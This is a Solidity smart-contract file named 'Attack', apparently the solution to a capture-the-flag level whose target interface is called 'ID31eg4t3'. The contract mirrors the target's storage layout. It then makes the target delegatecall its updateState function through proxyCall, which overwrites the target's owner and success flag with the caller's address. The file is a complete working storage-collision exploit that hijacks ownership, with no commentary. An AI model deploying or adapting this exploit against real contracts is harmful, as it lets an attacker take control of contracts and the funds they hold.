// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ID31eg4t3 {
    function proxyCall(bytes calldata data) external returns (address);
    function modifyState() external;
}

contract Attack {
    uint256 counter;
    uint8 index;
    string private identifier;
    address private delegate;
    uint8 flag;
    address public contractOwner;
    mapping(address => bool) public isSuccessful;
    address internal immutable targetContract;

    constructor(address targetAddress) payable {
        targetContract = targetAddress;
    }

    function updateState(address newOwner) public {
        isSuccessful[newOwner] = true;
        contractOwner = newOwner;
    }

    function exploit() external {
        bytes memory payload = abi.encodeWithSignature("updateState(address)", msg.sender);
        ID31eg4t3(targetContract).proxyCall(payload);
    }
}
